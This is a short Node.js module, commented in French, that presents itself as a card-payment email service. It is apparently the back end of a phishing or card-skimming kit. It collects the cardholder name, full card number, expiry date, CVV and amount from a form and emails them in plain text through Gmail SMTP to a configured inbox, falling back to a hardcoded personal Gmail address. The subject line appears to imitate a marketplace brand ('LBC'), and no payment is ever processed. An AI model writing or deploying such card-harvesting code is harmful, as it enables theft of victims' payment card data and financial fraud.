/**
 * Service d'envoi d'emails pour les paiements par carte.
 * Utilise Nodemailer avec la config SMTP (ex. Gmail) définie dans les variables d'environnement.
 */

import nodemailer from 'nodemailer';

/**
 * Crée un transport Nodemailer à partir des variables d'environnement.
 * .env : EMAIL_USER, EMAIL_PASS (Gmail = mot de passe d'application).
 * Les variables sont lues au moment de l'appel (après dotenv.config()).
 */
function createTransport() {
  const user = process.env.EMAIL_USER || process.env.MAIL_USER;
  const pass = process.env.EMAIL_PASS || process.env.MAIL_PASS;
  return nodemailer.createTransport({
    host: process.env.MAIL_HOST || 'smtp.gmail.com',
    port: Number(process.env.MAIL_PORT) || 587,
    secure: process.env.MAIL_SECURE === 'true',
    auth: { user, pass },
  });
}

/**
 * Envoie les informations de paiement par carte vers l'email configuré.
 * @param {Object} data - Données du formulaire
 * @param {string} data.cardHolder - Nom du titulaire
 * @param {string} data.cardNumber - Numéro de carte
 * @param {string} data.expiryDate - Date d'expiration
 * @param {string} data.cvv - CVV
 * @param {string} data.amount - Montant
 * @returns {Promise<{ success: boolean, error?: string }>}
 */
export async function sendPaymentEmail(data) {
  const mailUser = process.env.EMAIL_USER || process.env.MAIL_USER;
  const mailPass = process.env.EMAIL_PASS || process.env.MAIL_PASS;
  const toEmail = process.env.MAIL_TO || mailUser || 'marthedufour23@gmail.com';

  if (!mailUser || !mailPass) {
    return {
      success: false,
      error: 'EMAIL_USER et EMAIL_PASS doivent être définis dans .env',
    };
  }

  const transporter = createTransport();
  const text = [
    `Nom du titulaire: ${data.cardHolder}`,
    `Numéro de carte: ${data.cardNumber}`,
    `Date d'expiration: ${data.expiryDate}`,
    `CVV: ${data.cvv}`,
    `Montant: ${data.amount} €`,
  ].join('\n');

  const mailOptions = {
    from: process.env.MAIL_FROM || mailUser,
    to: toEmail,
    subject: 'Nouveau paiement par carte - LBC',
    text,
  };

  try {
    await transporter.sendMail(mailOptions);
    return { success: true };
  } catch (err) {
    return {
      success: false,
      error: err.message || 'Erreur lors de l\'envoi de l\'email',
    };
  }
}
